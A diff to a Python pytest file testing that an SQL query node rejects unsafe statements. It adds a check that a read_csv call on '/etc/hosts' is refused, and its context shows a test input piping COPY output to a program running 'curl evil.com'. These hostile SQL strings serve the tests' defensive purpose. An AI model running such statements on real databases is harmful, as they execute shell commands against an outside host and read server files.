@@ -39,6 +39,11 @@ class TestSqlQueryNodeValidation:
         with pytest.raises(UnsafeSQLError):
             execute_sql_query(sample_engine, sql_code="COPY (SELECT * FROM input_1) TO PROGRAM 'curl evil.com'")
 
+    def test_read_csv_table_function_refused_in_execute(self, sample_engine: FlowDataEngine) -> None:
+        """The sql_query node must refuse table functions that read server files."""
+        with pytest.raises(UnsafeSQLError, match="table functions"):
+            execute_sql_query(sample_engine, sql_code="SELECT * FROM read_csv('/etc/hosts')")
+
     def test_valid_select_passes(self, sample_engine: FlowDataEngine) -> None:
         result = execute_sql_query(sample_engine, sql_code="SELECT * FROM input_1")
         assert result.data_frame.collect().shape[0] == 3
